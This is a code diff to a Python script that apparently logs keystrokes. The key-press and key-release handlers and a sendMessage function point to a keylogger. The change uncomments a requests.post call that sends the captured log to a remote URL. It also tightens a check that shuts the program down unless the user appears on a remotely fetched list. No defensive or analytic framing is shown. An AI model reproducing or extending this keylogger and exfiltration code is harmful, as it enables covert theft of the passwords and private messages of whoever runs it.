@@ -24,6 +24,7 @@ def init():
         print(r.status_code, r.reason)
     except:
         print("Error sending request")
+        destroy()
 
 def on_press(key):
     global message
@@ -53,23 +54,27 @@ def on_release(key):
 
 def sendMessage(log):
     try:
-        # r = requests.post(URL,data={"msg":log})
-        # print(r.status_code, r.reason)
+        r = requests.post(URL,data={"msg":log})
+        print(r.status_code, r.reason)
         print("stfu")
     except:
         print("Error sending request")
     getUsers()
 
 def getUsers():
+    r = None
+
     try:
         r = requests.get(getusersReq)
         print(r.status_code, r.reason)
     except:
         print("Error sending request")
-    usersjson = r.json()
-    users = usersjson['users']
-    if user not in users:
-        destroy()
+
+    if r is not None:
+        usersjson = r.json()
+        users = usersjson['users']
+        if user not in users:
+            destroy()
 
 def destroy():
     sys.exit()
